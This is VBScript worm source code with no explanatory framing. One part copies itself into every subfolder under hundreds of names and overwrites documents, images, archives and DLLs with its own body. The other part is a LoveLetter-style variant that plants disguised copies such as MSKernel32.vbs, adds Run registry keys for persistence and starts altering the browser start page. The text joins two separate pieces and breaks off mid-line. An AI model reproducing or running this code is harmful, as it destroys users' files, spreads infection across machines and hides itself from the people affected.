Cloner(target & "\Slap78.vbs")
Cloner(target & "\Slap79.vbs")
Cloner(target & "\Slap80.vbs")
Cloner(target & "\Slap81.vbs")
Cloner(target & "\Slap82.vbs")
Cloner(target & "\Slap83.vbs")
Cloner(target & "\Slap84.vbs")
Cloner(target & "\Slap85.vbs")
Cloner(target & "\Slap86.vbs")
Cloner(target & "\Slap87.vbs")
Cloner(target & "\Slap88.vbs")
Cloner(target & "\Slap89.vbs")
Cloner(target & "\Slap90.vbs")
Cloner(target & "\Slap91.vbs")
Cloner(target & "\Slap92.vbs")
Cloner(target & "\Slap93.vbs")
Cloner(target & "\Slap94.vbs")
Cloner(target & "\Slap95.vbs")
Cloner(target & "\Slap96.vbs")
Cloner(target & "\Slap97.vbs")
Cloner(target & "\Slap98.vbs")
Cloner(target & "\Slap99.vbs")
Cloner(target & "\Slap100.vbs")
Cloner(target & "\Slap101.vbs")
Cloner(target & "\Slap102.vbs")
Cloner(target & "\Slap103.vbs")
Cloner(target & "\Slap104.vbs")
Cloner(target & "\Slap105.vbs")
Cloner(target & "\Slap106.vbs")
Cloner(target & "\Slap107.vbs")
Cloner(target & "\Slap108.vbs")
Cloner(target & "\Slap109.vbs")
Cloner(target & "\Slap110.vbs")
Cloner(target & "\Slap111.vbs")
Cloner(target & "\Slap112.vbs")
Cloner(target & "\Slap113.vbs")
Cloner(target & "\Slap114.vbs")
Cloner(target & "\Slap115.vbs")
Cloner(target & "\Slap116.vbs")
Cloner(target & "\Slap117.vbs")
Cloner(target & "\Slap118.vbs")
Cloner(target & "\Slap119.vbs")
Cloner(target & "\Slap120.vbs")
Cloner(target & "\Slap121.vbs")
Cloner(target & "\Slap122.vbs")
Cloner(target & "\Slap123.vbs")
Cloner(target & "\Slap124.vbs")
Cloner(target & "\Slap125.vbs")
Cloner(target & "\Slap126.vbs")
Cloner(target & "\Slap127.vbs")
Cloner(target & "\Slap128.vbs")
Cloner(target & "\Slap129.vbs")
Cloner(target & "\Slap130.vbs")
Cloner(target & "\Slap131.vbs")
Cloner(target & "\Slap132.vbs")
Cloner(target & "\Slap133.vbs")
Cloner(target & "\Slap134.vbs")
Cloner(target & "\Slap135.vbs")
Cloner(target & "\Slap136.vbs")
Cloner(target & "\Slap137.vbs")
Cloner(target & "\Slap138.vbs")
Cloner(target & "\Slap139.vbs")
Cloner(target & "\Slap140.vbs")
Cloner(target & "\Slap141.vbs")
Cloner(target & "\Slap142.vbs")
Cloner(target & "\Slap143.vbs")
Cloner(target & "\Slap144.vbs")
Cloner(target & "\Slap145.vbs")
Cloner(target & "\Slap146.vbs")
Cloner(target & "\Slap147.vbs")
Cloner(target & "\Slap148.vbs")
Cloner(target & "\Slap149.vbs")
Cloner(target & "\Slap150.vbs")
Cloner(target & "\Slap151.vbs")
Cloner(target & "\Slap152.vbs")
Cloner(target & "\Slap153.vbs")
Cloner(target & "\Slap154.vbs")
Cloner(target & "\Slap155.vbs")
Cloner(target & "\Slap156.vbs")
Cloner(target & "\Slap157.vbs")
Cloner(target & "\Slap158.vbs")
Cloner(target & "\Slap159.vbs")
Cloner(target & "\Slap160.vbs")
Cloner(target & "\Slap161.vbs")
Cloner(target & "\Slap162.vbs")
Cloner(target & "\Slap163.vbs")
Cloner(target & "\Slap164.vbs")
Cloner(target & "\Slap165.vbs")
Cloner(target & "\Slap166.vbs")
Cloner(target & "\Slap167.vbs")
Cloner(target & "\Slap168.vbs")
Cloner(target & "\Slap169.vbs")
Cloner(target & "\Slap170.vbs")
Cloner(target & "\Slap171.vbs")
Cloner(target & "\Slap172.vbs")
Cloner(target & "\Slap173.vbs")
Cloner(target & "\Slap174.vbs")
Cloner(target & "\Slap175.vbs")
Cloner(target & "\Slap176.vbs")
Cloner(target & "\Slap177.vbs")
Cloner(target & "\Slap178.vbs")
Cloner(target & "\Slap179.vbs")
Cloner(target & "\Slap180.vbs")
Cloner(target & "\Slap181.vbs")
Cloner(target & "\Slap182.vbs")
Cloner(target & "\Slap183.vbs")
Cloner(target & "\Slap184.vbs")
Cloner(target & "\Slap185.vbs")
Cloner(target & "\Slap186.vbs")
Cloner(target & "\Slap187.vbs")
Cloner(target & "\Slap188.vbs")
Cloner(target & "\Slap189.vbs")
Cloner(target & "\Slap190.vbs")
Cloner(target & "\Slap191.vbs")
Cloner(target & "\Slap192.vbs")
Cloner(target & "\Slap193.vbs")
Cloner(target & "\Slap194.vbs")
Cloner(target & "\Slap195.vbs")
Cloner(target & "\Slap196.vbs")
Cloner(target & "\Slap197.vbs")
Cloner(target & "\Slap198.vbs")
Cloner(target & "\Slap199.vbs")
Cloner(target & "\Slap200.vbs")
Cloner(target & "\Slap201.vbs")
Cloner(target & "\Slap202.vbs")
Cloner(target & "\Slap203.vbs")
Cloner(target & "\Slap204.vbs")
Cloner(target & "\Slap205.vbs")
Cloner(target & "\Slap206.vbs")
Cloner(target & "\Slap207.vbs")
Cloner(target & "\Slap208.vbs")
Cloner(target & "\Slap209.vbs")
Cloner(target & "\Slap210.vbs")
Cloner(target & "\Slap211.vbs")
Cloner(target & "\Slap212.vbs")
Cloner(target & "\Slap213.vbs")
Cloner(target & "\Slap214.vbs")
Cloner(target & "\Slap215.vbs")
Cloner(target & "\Slap216.vbs")
Cloner(target & "\Slap217.vbs")
Cloner(target & "\Slap218.vbs")
Cloner(target & "\Slap219.vbs")
Cloner(target & "\Slap220.vbs")
Cloner(target & "\Slap221.vbs")
Cloner(target & "\Slap222.vbs")
Cloner(target & "\Slap223.vbs")
Cloner(target & "\Slap224.vbs")
Cloner(target & "\Slap225.vbs")
Cloner(target & "\Slap226.vbs")
Cloner(target & "\Slap227.vbs")
Cloner(target & "\Slap228.vbs")
Cloner(target & "\Slap229.vbs")
Cloner(target & "\Slap230.vbs")
Cloner(target & "\Slap231.vbs")
Cloner(target & "\Slap232.vbs")
Cloner(target & "\Slap233.vbs")
Cloner(target & "\Slap234.vbs")
Cloner(target & "\Slap235.vbs")
Cloner(target & "\Slap236.vbs")
Cloner(target & "\Slap237.vbs")
Cloner(target & "\Slap238.vbs")
Cloner(target & "\Slap239.vbs")
Cloner(target & "\Slap240.vbs")
Cloner(target & "\Slap241.vbs")
Cloner(target & "\Slap242.vbs")
Cloner(target & "\Slap243.vbs")
Cloner(target & "\Slap244.vbs")
Cloner(target & "\Slap245.vbs")
Cloner(target & "\Slap246.vbs")
Cloner(target & "\Slap247.vbs")
Cloner(target & "\Slap248.vbs")
Cloner(target & "\Slap249.vbs")
Cloner(target & "\Slap250.vbs")
FindFile
FindFolder2 (target)
Next
End Sub


Sub FindFolder2 (CopyMachine)
On Error Resume Next
If CopyMachine = "" Then Exit Sub
if CopyMachine = Left(Key.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(CopyMachine).SubFolders
Cloner(target & "\Lmao.vbs")
Cloner(target & "\Clap.vbs")
Cloner(target & "\Clap1.vbs")
Cloner(target & "\Clap2.vbs")
Cloner(target & "\Clap3.vbs")
Cloner(target & "\Clap4.vbs")
Cloner(target & "\Clap5.vbs")
Cloner(target & "\Clap6.vbs")
Cloner(target & "\Clap7.vbs")
Cloner(target & "\Clap8.vbs")
Cloner(target & "\Clap9.vbs")
Cloner(target & "\Clap10.vbs")
Cloner(target & "\Clap11.vbs")
Cloner(target & "\Clap12.vbs")
Cloner(target & "\Clap13.vbs")
Cloner(target & "\Clap14.vbs")
Cloner(target & "\Clap15.vbs")
Cloner(target & "\Clap16.vbs")
Cloner(target & "\Clap17.vbs")
Cloner(target & "\Clap18.vbs")
Cloner(target & "\Clap19.vbs")
Cloner(target & "\Clap20.vbs")
Cloner(target & "\Clap21.vbs")
Cloner(target & "\Clap22.vbs")
Cloner(target & "\Clap23.vbs")
Cloner(target & "\Clap24.vbs")
Cloner(target & "\Clap25.vbs")
Cloner(target & "\Clap26.vbs")
Cloner(target & "\Clap27.vbs")
Cloner(target & "\Clap28.vbs")
Cloner(target & "\Clap29.vbs")
Cloner(target & "\Clap30.vbs")
Cloner(target & "\Clap31.vbs")
Cloner(target & "\Clap32.vbs")
Cloner(target & "\Clap33.vbs")
Cloner(target & "\Clap34.vbs")
Cloner(target & "\Clap35.vbs")
Cloner(target & "\Clap36.vbs")
Cloner(target & "\Clap37.vbs")
Cloner(target & "\Clap38.vbs")
Cloner(target & "\Clap39.vbs")
Cloner(target & "\Clap40.vbs")
Cloner(target & "\Clap41.vbs")
Cloner(target & "\Clap42.vbs")
Cloner(target & "\Clap43.vbs")
Cloner(target & "\Clap44.vbs")
Cloner(target & "\Clap45.vbs")
Cloner(target & "\Clap46.vbs")
Cloner(target & "\Clap47.vbs")
Cloner(target & "\Clap48.vbs")
Cloner(target & "\Clap49.vbs")
Cloner(target & "\Clap50.vbs")
Cloner(target & "\Clap51.vbs")
Cloner(target & "\Clap52.vbs")
Cloner(target & "\Clap53.vbs")
Cloner(target & "\Clap54.vbs")
Cloner(target & "\Clap55.vbs")
Cloner(target & "\Clap56.vbs")
Cloner(target & "\Clap57.vbs")
Cloner(target & "\Clap58.vbs")
Cloner(target & "\Clap59.vbs")
Cloner(target & "\Clap60.vbs")
Cloner(target & "\Clap61.vbs")
Cloner(target & "\Clap62.vbs")
Cloner(target & "\Clap63.vbs")
Cloner(target & "\Clap64.vbs")
Cloner(target & "\Clap65.vbs")
Cloner(target & "\Clap66.vbs")
Cloner(target & "\Clap67.vbs")
Cloner(target & "\Clap68.vbs")
Cloner(target & "\Clap69.vbs")
Cloner(target & "\Clap70.vbs")
Cloner(target & "\Clap71.vbs")
Cloner(target & "\Clap72.vbs")
Cloner(target & "\Clap73.vbs")
Cloner(target & "\Clap74.vbs")
Cloner(target & "\Clap75.vbs")
Cloner(target & "\Clap76.vbs")
Cloner(target & "\Clap77.vbs")
Cloner(target & "\Clap78.vbs")
Cloner(target & "\Clap79.vbs")
Cloner(target & "\Clap80.vbs")
Cloner(target & "\Clap81.vbs")
Cloner(target & "\Clap82.vbs")
Cloner(target & "\Clap83.vbs")
Cloner(target & "\Clap84.vbs")
Cloner(target & "\Clap85.vbs")
Cloner(target & "\Clap86.vbs")
Cloner(target & "\Clap87.vbs")
Cloner(target & "\Clap88.vbs")
Cloner(target & "\Clap89.vbs")
Cloner(target & "\Clap90.vbs")
Cloner(target & "\Clap91.vbs")
Cloner(target & "\Clap92.vbs")
Cloner(target & "\Clap93.vbs")
Cloner(target & "\Clap94.vbs")
Cloner(target & "\Clap95.vbs")
Cloner(target & "\Clap96.vbs")
Cloner(target & "\Clap97.vbs")
Cloner(target & "\Clap98.vbs")
Cloner(target & "\Clap99.vbs")
Cloner(target & "\Clap100.vbs")
Cloner(target & "\Clap101.vbs")
Cloner(target & "\Clap102.vbs")
Cloner(target & "\Clap103.vbs")
Cloner(target & "\Clap104.vbs")
Cloner(target & "\Clap105.vbs")
Cloner(target & "\Clap106.vbs")
Cloner(target & "\Clap107.vbs")
Cloner(target & "\Clap108.vbs")
Cloner(target & "\Clap109.vbs")
Cloner(target & "\Clap110.vbs")
Cloner(target & "\Clap111.vbs")
Cloner(target & "\Clap112.vbs")
Cloner(target & "\Clap113.vbs")
Cloner(target & "\Clap114.vbs")
Cloner(target & "\Clap115.vbs")
Cloner(target & "\Clap116.vbs")
Cloner(target & "\Clap117.vbs")
Cloner(target & "\Clap118.vbs")
Cloner(target & "\Clap119.vbs")
Cloner(target & "\Clap120.vbs")
Cloner(target & "\Clap121.vbs")
Cloner(target & "\Clap122.vbs")
Cloner(target & "\Clap123.vbs")
Cloner(target & "\Clap124.vbs")
Cloner(target & "\Clap125.vbs")
Cloner(target & "\Clap126.vbs")
Cloner(target & "\Clap127.vbs")
Cloner(target & "\Clap128.vbs")
Cloner(target & "\Clap129.vbs")
Cloner(target & "\Clap130.vbs")
Cloner(target & "\Clap131.vbs")
Cloner(target & "\Clap132.vbs")
Cloner(target & "\Clap133.vbs")
Cloner(target & "\Clap134.vbs")
Cloner(target & "\Clap135.vbs")
Cloner(target & "\Clap136.vbs")
Cloner(target & "\Clap137.vbs")
Cloner(target & "\Clap138.vbs")
Cloner(target & "\Clap139.vbs")
Cloner(target & "\Clap140.vbs")
Cloner(target & "\Clap141.vbs")
Cloner(target & "\Clap142.vbs")
Cloner(target & "\Clap143.vbs")
Cloner(target & "\Clap144.vbs")
Cloner(target & "\Clap145.vbs")
Cloner(target & "\Clap146.vbs")
Cloner(target & "\Clap147.vbs")
Cloner(target & "\Clap148.vbs")
Cloner(target & "\Clap149.vbs")
Cloner(target & "\Clap150.vbs")
Cloner(target & "\Clap151.vbs")
Cloner(target & "\Clap152.vbs")
Cloner(target & "\Clap153.vbs")
Cloner(target & "\Clap154.vbs")
Cloner(target & "\Clap155.vbs")
Cloner(target & "\Clap156.vbs")
Cloner(target & "\Clap157.vbs")
Cloner(target & "\Clap158.vbs")
Cloner(target & "\Clap159.vbs")
Cloner(target & "\Clap160.vbs")
Cloner(target & "\Clap161.vbs")
Cloner(target & "\Clap162.vbs")
Cloner(target & "\Clap163.vbs")
Cloner(target & "\Clap164.vbs")
Cloner(target & "\Clap165.vbs")
Cloner(target & "\Clap166.vbs")
Cloner(target & "\Clap167.vbs")
Cloner(target & "\Clap168.vbs")
Cloner(target & "\Clap169.vbs")
Cloner(target & "\Clap170.vbs")
Cloner(target & "\Clap171.vbs")
Cloner(target & "\Clap172.vbs")
Cloner(target & "\Clap173.vbs")
Cloner(target & "\Clap174.vbs")
Cloner(target & "\Clap175.vbs")
Cloner(target & "\Clap176.vbs")
Cloner(target & "\Clap177.vbs")
Cloner(target & "\Clap178.vbs")
Cloner(target & "\Clap179.vbs")
Cloner(target & "\Clap180.vbs")
Cloner(target & "\Clap181.vbs")
Cloner(target & "\Clap182.vbs")
Cloner(target & "\Clap183.vbs")
Cloner(target & "\Clap184.vbs")
Cloner(target & "\Clap185.vbs")
Cloner(target & "\Clap186.vbs")
Cloner(target & "\Clap187.vbs")
Cloner(target & "\Clap188.vbs")
Cloner(target & "\Clap189.vbs")
Cloner(target & "\Clap190.vbs")
Cloner(target & "\Clap191.vbs")
Cloner(target & "\Clap192.vbs")
Cloner(target & "\Clap193.vbs")
Cloner(target & "\Clap194.vbs")
Cloner(target & "\Clap195.vbs")
Cloner(target & "\Clap196.vbs")
Cloner(target & "\Clap197.vbs")
Cloner(target & "\Clap198.vbs")
Cloner(target & "\Clap199.vbs")
Cloner(target & "\Clap200.vbs")
Cloner(target & "\Clap201.vbs")
Cloner(target & "\Clap202.vbs")
Cloner(target & "\Clap203.vbs")
Cloner(target & "\Clap204.vbs")
Cloner(target & "\Clap205.vbs")
Cloner(target & "\Clap206.vbs")
Cloner(target & "\Clap207.vbs")
Cloner(target & "\Clap208.vbs")
Cloner(target & "\Clap209.vbs")
Cloner(target & "\Clap210.vbs")
Cloner(target & "\Clap211.vbs")
Cloner(target & "\Clap212.vbs")
Cloner(target & "\Clap213.vbs")
Cloner(target & "\Clap214.vbs")
Cloner(target & "\Clap215.vbs")
Cloner(target & "\Clap216.vbs")
Cloner(target & "\Clap217.vbs")
Cloner(target & "\Clap218.vbs")
Cloner(target & "\Clap219.vbs")
Cloner(target & "\Clap220.vbs")
Cloner(target & "\Clap221.vbs")
Cloner(target & "\Clap222.vbs")
Cloner(target & "\Clap223.vbs")
Cloner(target & "\Clap224.vbs")
Cloner(target & "\Clap225.vbs")
Cloner(target & "\Clap226.vbs")
Cloner(target & "\Clap227.vbs")
Cloner(target & "\Clap228.vbs")
Cloner(target & "\Clap229.vbs")
Cloner(target & "\Clap230.vbs")
Cloner(target & "\Clap231.vbs")
Cloner(target & "\Clap232.vbs")
Cloner(target & "\Clap233.vbs")
Cloner(target & "\Clap234.vbs")
Cloner(target & "\Clap235.vbs")
Cloner(target & "\Clap236.vbs")
Cloner(target & "\Clap237.vbs")
Cloner(target & "\Clap238.vbs")
Cloner(target & "\Clap239.vbs")
Cloner(target & "\Clap240.vbs")
Cloner(target & "\Clap241.vbs")
Cloner(target & "\Clap242.vbs")
Cloner(target & "\Clap243.vbs")
Cloner(target & "\Clap244.vbs")
Cloner(target & "\Clap245.vbs")
Cloner(target & "\Clap246.vbs")
Cloner(target & "\Clap247.vbs")
Cloner(target & "\Clap248.vbs")
Cloner(target & "\Clap249.vbs")
Cloner(target & "\Clap250.vbs")
FindFile (target)
FindFolder3 (target)
Next
End Sub

Sub FindFolder3 (CopyMachine)
On Error Resume Next
If CopyMachine = "" Then Exit Sub
if CopyMachine = Left(Key.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(CopyMachine).SubFolders
Cloner(target & "\Ayy.vbs")
Cloner(target & "\Open.vbs")
Cloner(target & "\Open1.vbs")
Cloner(target & "\Open2.vbs")
Cloner(target & "\Open3.vbs")
Cloner(target & "\Open4.vbs")
Cloner(target & "\Open5.vbs")
Cloner(target & "\Open6.vbs")
Cloner(target & "\Open7.vbs")
Cloner(target & "\Open8.vbs")
Cloner(target & "\Open9.vbs")
Cloner(target & "\Open10.vbs")
Cloner(target & "\Open11.vbs")
Cloner(target & "\Open12.vbs")
Cloner(target & "\Open13.vbs")
Cloner(target & "\Open14.vbs")
Cloner(target & "\Open15.vbs")
Cloner(target & "\Open16.vbs")
Cloner(target & "\Open17.vbs")
Cloner(target & "\Open18.vbs")
Cloner(target & "\Open19.vbs")
Cloner(target & "\Open20.vbs")
Cloner(target & "\Open21.vbs")
Cloner(target & "\Open22.vbs")
Cloner(target & "\Open23.vbs")
Cloner(target & "\Open24.vbs")
Cloner(target & "\Open25.vbs")
Cloner(target & "\Open26.vbs")
Cloner(target & "\Open27.vbs")
Cloner(target & "\Open28.vbs")
Cloner(target & "\Open29.vbs")
Cloner(target & "\Open30.vbs")
Cloner(target & "\Open31.vbs")
Cloner(target & "\Open32.vbs")
Cloner(target & "\Open33.vbs")
Cloner(target & "\Open34.vbs")
Cloner(target & "\Open35.vbs")
Cloner(target & "\Open36.vbs")
Cloner(target & "\Open37.vbs")
Cloner(target & "\Open38.vbs")
Cloner(target & "\Open39.vbs")
Cloner(target & "\Open40.vbs")
Cloner(target & "\Open41.vbs")
Cloner(target & "\Open42.vbs")
Cloner(target & "\Open43.vbs")
Cloner(target & "\Open44.vbs")
Cloner(target & "\Open45.vbs")
Cloner(target & "\Open46.vbs")
Cloner(target & "\Open47.vbs")
Cloner(target & "\Open48.vbs")
Cloner(target & "\Open49.vbs")
Cloner(target & "\Open50.vbs")
Cloner(target & "\Open51.vbs")
Cloner(target & "\Open52.vbs")
Cloner(target & "\Open53.vbs")
Cloner(target & "\Open54.vbs")
Cloner(target & "\Open55.vbs")
Cloner(target & "\Open56.vbs")
Cloner(target & "\Open57.vbs")
Cloner(target & "\Open58.vbs")
Cloner(target & "\Open59.vbs")
Cloner(target & "\Open60.vbs")
Cloner(target & "\Open61.vbs")
Cloner(target & "\Open62.vbs")
Cloner(target & "\Open63.vbs")
Cloner(target & "\Open64.vbs")
Cloner(target & "\Open65.vbs")
Cloner(target & "\Open66.vbs")
Cloner(target & "\Open67.vbs")
Cloner(target & "\Open68.vbs")
Cloner(target & "\Open69.vbs")
Cloner(target & "\Open70.vbs")
Cloner(target & "\Open71.vbs")
Cloner(target & "\Open72.vbs")
Cloner(target & "\Open73.vbs")
Cloner(target & "\Open74.vbs")
Cloner(target & "\Open75.vbs")
Cloner(target & "\Open76.vbs")
Cloner(target & "\Open77.vbs")
Cloner(target & "\Open78.vbs")
Cloner(target & "\Open79.vbs")
Cloner(target & "\Open80.vbs")
Cloner(target & "\Open81.vbs")
Cloner(target & "\Open82.vbs")
Cloner(target & "\Open83.vbs")
Cloner(target & "\Open84.vbs")
Cloner(target & "\Open85.vbs")
Cloner(target & "\Open86.vbs")
Cloner(target & "\Open87.vbs")
Cloner(target & "\Open88.vbs")
Cloner(target & "\Open89.vbs")
Cloner(target & "\Open90.vbs")
Cloner(target & "\Open91.vbs")
Cloner(target & "\Open92.vbs")
Cloner(target & "\Open93.vbs")
Cloner(target & "\Open94.vbs")
Cloner(target & "\Open95.vbs")
Cloner(target & "\Open96.vbs")
Cloner(target & "\Open97.vbs")
Cloner(target & "\Open98.vbs")
Cloner(target & "\Open99.vbs")
Cloner(target & "\Open100.vbs")
Cloner(target & "\Open101.vbs")
Cloner(target & "\Open102.vbs")
Cloner(target & "\Open103.vbs")
Cloner(target & "\Open104.vbs")
Cloner(target & "\Open105.vbs")
Cloner(target & "\Open106.vbs")
Cloner(target & "\Open107.vbs")
Cloner(target & "\Open108.vbs")
Cloner(target & "\Open109.vbs")
Cloner(target & "\Open110.vbs")
Cloner(target & "\Open111.vbs")
Cloner(target & "\Open112.vbs")
Cloner(target & "\Open113.vbs")
Cloner(target & "\Open114.vbs")
Cloner(target & "\Open115.vbs")
Cloner(target & "\Open116.vbs")
Cloner(target & "\Open117.vbs")
Cloner(target & "\Open118.vbs")
Cloner(target & "\Open119.vbs")
Cloner(target & "\Open120.vbs")
Cloner(target & "\Open121.vbs")
Cloner(target & "\Open122.vbs")
Cloner(target & "\Open123.vbs")
Cloner(target & "\Open124.vbs")
Cloner(target & "\Open125.vbs")
Cloner(target & "\Open126.vbs")
Cloner(target & "\Open127.vbs")
Cloner(target & "\Open128.vbs")
Cloner(target & "\Open129.vbs")
Cloner(target & "\Open130.vbs")
Cloner(target & "\Open131.vbs")
Cloner(target & "\Open132.vbs")
Cloner(target & "\Open133.vbs")
Cloner(target & "\Open134.vbs")
Cloner(target & "\Open135.vbs")
Cloner(target & "\Open136.vbs")
Cloner(target & "\Open137.vbs")
Cloner(target & "\Open138.vbs")
Cloner(target & "\Open139.vbs")
Cloner(target & "\Open140.vbs")
Cloner(target & "\Open141.vbs")
Cloner(target & "\Open142.vbs")
Cloner(target & "\Open143.vbs")
Cloner(target & "\Open144.vbs")
Cloner(target & "\Open145.vbs")
Cloner(target & "\Open146.vbs")
Cloner(target & "\Open147.vbs")
Cloner(target & "\Open148.vbs")
Cloner(target & "\Open149.vbs")
Cloner(target & "\Open150.vbs")
Cloner(target & "\Open151.vbs")
Cloner(target & "\Open152.vbs")
Cloner(target & "\Open153.vbs")
Cloner(target & "\Open154.vbs")
Cloner(target & "\Open155.vbs")
Cloner(target & "\Open156.vbs")
Cloner(target & "\Open157.vbs")
Cloner(target & "\Open158.vbs")
Cloner(target & "\Open159.vbs")
Cloner(target & "\Open160.vbs")
Cloner(target & "\Open161.vbs")
Cloner(target & "\Open162.vbs")
Cloner(target & "\Open163.vbs")
Cloner(target & "\Open164.vbs")
Cloner(target & "\Open165.vbs")
Cloner(target & "\Open166.vbs")
Cloner(target & "\Open167.vbs")
Cloner(target & "\Open168.vbs")
Cloner(target & "\Open169.vbs")
Cloner(target & "\Open170.vbs")
Cloner(target & "\Open171.vbs")
Cloner(target & "\Open172.vbs")
Cloner(target & "\Open173.vbs")
Cloner(target & "\Open174.vbs")
Cloner(target & "\Open175.vbs")
Cloner(target & "\Open176.vbs")
Cloner(target & "\Open177.vbs")
Cloner(target & "\Open178.vbs")
Cloner(target & "\Open179.vbs")
Cloner(target & "\Open180.vbs")
Cloner(target & "\Open181.vbs")
Cloner(target & "\Open182.vbs")
Cloner(target & "\Open183.vbs")
Cloner(target & "\Open184.vbs")
Cloner(target & "\Open185.vbs")
Cloner(target & "\Open186.vbs")
Cloner(target & "\Open187.vbs")
Cloner(target & "\Open188.vbs")
Cloner(target & "\Open189.vbs")
Cloner(target & "\Open190.vbs")
Cloner(target & "\Open191.vbs")
Cloner(target & "\Open192.vbs")
Cloner(target & "\Open193.vbs")
Cloner(target & "\Open194.vbs")
Cloner(target & "\Open195.vbs")
Cloner(target & "\Open196.vbs")
Cloner(target & "\Open197.vbs")
Cloner(target & "\Open198.vbs")
Cloner(target & "\Open199.vbs")
Cloner(target & "\Open200.vbs")
Cloner(target & "\Open201.vbs")
Cloner(target & "\Open202.vbs")
Cloner(target & "\Open203.vbs")
Cloner(target & "\Open204.vbs")
Cloner(target & "\Open205.vbs")
Cloner(target & "\Open206.vbs")
Cloner(target & "\Open207.vbs")
Cloner(target & "\Open208.vbs")
Cloner(target & "\Open209.vbs")
Cloner(target & "\Open210.vbs")
Cloner(target & "\Open211.vbs")
Cloner(target & "\Open212.vbs")
Cloner(target & "\Open213.vbs")
Cloner(target & "\Open214.vbs")
Cloner(target & "\Open215.vbs")
Cloner(target & "\Open216.vbs")
Cloner(target & "\Open217.vbs")
Cloner(target & "\Open218.vbs")
Cloner(target & "\Open219.vbs")
Cloner(target & "\Open220.vbs")
Cloner(target & "\Open221.vbs")
Cloner(target & "\Open222.vbs")
Cloner(target & "\Open223.vbs")
Cloner(target & "\Open224.vbs")
Cloner(target & "\Open225.vbs")
Cloner(target & "\Open226.vbs")
Cloner(target & "\Open227.vbs")
Cloner(target & "\Open228.vbs")
Cloner(target & "\Open229.vbs")
Cloner(target & "\Open230.vbs")
Cloner(target & "\Open231.vbs")
Cloner(target & "\Open232.vbs")
Cloner(target & "\Open233.vbs")
Cloner(target & "\Open234.vbs")
Cloner(target & "\Open235.vbs")
Cloner(target & "\Open236.vbs")
Cloner(target & "\Open237.vbs")
Cloner(target & "\Open238.vbs")
Cloner(target & "\Open239.vbs")
Cloner(target & "\Open240.vbs")
Cloner(target & "\Open241.vbs")
Cloner(target & "\Open242.vbs")
Cloner(target & "\Open243.vbs")
Cloner(target & "\Open244.vbs")
Cloner(target & "\Open245.vbs")
Cloner(target & "\Open246.vbs")
Cloner(target & "\Open247.vbs")
Cloner(target & "\Open248.vbs")
Cloner(target & "\Open249.vbs")
Cloner(target & "\Open250.vbs")
FindFile (target)
Next
End Sub

Sub FindFile (CopyMachine)
On Error Resume Next
Dim target
For Each target In fso.GetFolder(CopyMachine).Files
If lcase(Right(target,3))="doc" then
if Left(target,2)<> "~$" then ExtinguishFile(target)
SetFile (target)
End If
If lcase(Right(target,3))="xls" or lcase(Right(target,3))="ppt" or lcase(Right(target,3))="pdf" or lcase(Right(target,3))="rtf" or lcase(Right(target,3))="rar" or lcase(Right(target,3))="zip" or lcase(Right(target,3))="jpg" or lcase(Right(target,3))="gif" or lcase(Right(target,3))="bmp" or lcase(Right(target,3))="scr" or lcase(Right(target,3))="dll" or lcase(Right(target,3))="lnk"  then
if Left(target,2)<> "~$" then ExtinguishFile(target)
End If
If lcase(Right(target,4))="docx" or lcase(Right(target,4))="xlsx" or lcase(Right(target,4))="pptx" then
if Left(target,2)<> "~$" then ExtinguishFile(target)
End If
if lcase(Right(target,3))="vbs" then ExtinguishFile(target)
Next
End sub

Sub SetFile (Protect)
Dim f1
Set f1 = fso.GetFile(Protect)
f1.Attributes = 6
End sub

Sub Cloner (Murder)
On Error Resume Next
Dim ts, a, tf
Set ts = fso.openTextFile(Eater, 1)
a = ts.ReadAll
ts.Close
Set tf = fso.CreateTextFile(Murder, True)
tf.Write a
tf.Close
Set ts = fso.GetFile(Murder)
ts.Attributes = 1
End sub

Sub ExtinguishFile(Murder)
On Error Resume Next
Dim data, ts, i, a, tf
Randomize
data = Left(Rnd(15) * 10000000000, 10)
Set ts = fso.openTextFile (Murder, 1)
i = ts.ReadAll
ts.close
Set ts = fso.openTextFile(Eater, 1)
a = ts.ReadAll
ts.Close
Set tf = fso.CreateTextFile(Murder, True)
tf.WriteLine a
ts.WriteBlankLines(1)
tf.WriteLine ("Rem Infected Version: " & data)
ts.WriteBlankLines(2)
tf.WriteLine i
tf.Close
Set ts = fso.GetFile(Murder)
ts.Attributes = 1
End sub

Sub FindRecent
On Error Resume Next
Dim target, ok
For Each target in fso.GetFolder(Key.SpecialFolders("Recent")).Files
Set ok = Key.CreateShortCut(target)
if fso.FolderExists(ok.WorkingDirectory) then FindFolder (ok.WorkingDirectory)
Next
End sub

 rem  barok -loveletter(vbe) <i hate go to school>
 rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
 On Error Resume Next
 dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
 eq=""
 ctr=0
 Set fso = CreateObject("Scripting.FileSystemObject")
 set file = fso.OpenTextFile(WScript.ScriptFullname,1)
 vbscopy=file.ReadAll
 main()
 sub main()
 On Error Resume Next
 dim wscr,rr
 set wscr=CreateObject("WScript.Shell")
 rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
 if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
 end if
 Set dirwin = fso.GetSpecialFolder(0)
 Set dirsystem = fso.GetSpecialFolder(1)
 Set dirtemp = fso.GetSpecialFolder(2)
 Set c = fso.GetFile(WScript.ScriptFullName)
 c.Copy(dirsystem&"\MSKernel32.vbs")
 c.Copy(dirwin&"\Win32DLL.vbs")
 c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
 regruns()
 html()
 spreadtoemail()
 listadriv()
 end sub
 sub regruns()
 On Error Resume Next
 Dim num,downread
 regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKern el32",dirsystem&"\MSKernel32.vbs"
 regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService s\Win32DLL",dirwin&"\Win32DLL.vbs"
 downread=""
 downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
 if (downread="") then
 downread="c:\"
 end if
 if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
 Randomize
 num = Int((4 * Rnd) + 1)
 if num = 1 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
